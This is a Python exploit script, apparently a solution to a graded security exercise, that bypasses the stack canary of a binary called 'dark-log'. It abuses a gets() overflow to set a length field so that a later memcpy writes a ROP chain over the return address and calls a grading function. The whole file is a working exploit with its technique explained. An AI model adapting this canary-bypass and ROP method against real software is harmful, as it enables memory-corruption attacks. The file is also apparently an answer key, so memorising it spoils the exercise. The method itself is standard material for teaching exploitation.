#!/usr/bin/env python3
"""Task 4: bypass the stack canary of attack/dark-log.

struct log_frame { char expression[128]; char logMsg[128]; int len; char pad[8]; }
is laid out on the stack as

    rbp-0x120 expression[128]     <- gets() writes here
    rbp-0x0a0 logMsg[128]
    rbp-0x020 len (int)
    rbp-0x008 canary
    rbp       saved rbp
    rbp+0x008 return address

`gets(f.expression)` can only write 260 bytes before the canary, which is
enough to reach (but not pass) the `len` field.  The following inlined memcpy

    memcpy(f.logMsg + f.len, f.expression, 128);

then copies our first 128 bytes from expression[] to rbp-0xa0+len.  By setting
len = 0xa8 = 168 the destination becomes rbp+8: the canary is never touched but
the return address and the stack above it are overwritten with a ROP chain.
"""
import struct
import sys

p64 = lambda x: struct.pack("<Q", x)
p32 = lambda x: struct.pack("<I", x)

RET = 0x4018A4        # ret (alignment)
POP_RDI = 0x4018A3    # pop rdi ; ret
GRADE_EVAL = 0x401677 # grade_eval(int)

chain = p64(RET) + p64(POP_RDI) + p64(4) + p64(GRADE_EVAL) + p64(0)
payload = bytearray(chain.ljust(128, b"B"))   # expression[128], copied to rbp+8
payload += b"C" * 128                         # logMsg[128]
payload += p32(0xA8)                          # len = 168 -> dest = rbp+8
# 260 bytes total: gets() stops here (newline/EOF) and cannot reach the canary.

sys.stdout.buffer.write(payload)
